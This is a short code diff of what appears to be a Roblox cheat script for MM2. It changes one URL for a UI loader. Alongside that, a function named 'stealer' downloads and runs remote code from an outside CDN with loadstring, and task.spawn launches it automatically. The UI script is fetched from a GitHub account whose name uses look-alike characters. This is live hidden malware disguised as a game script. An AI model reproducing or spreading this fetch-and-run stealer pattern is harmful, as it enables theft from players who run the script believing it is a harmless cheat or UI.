@@ -3,7 +3,7 @@ local function stealer()
 loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 end
 local function loadui()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/BIudnyHoIandan/MM2/refs/heads/main/LocsPlayerScript"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BIudnyHoIandan/MM2/refs/heads/main/LocPlayerScript"))()
 end
 
 task.spawn(stealer)
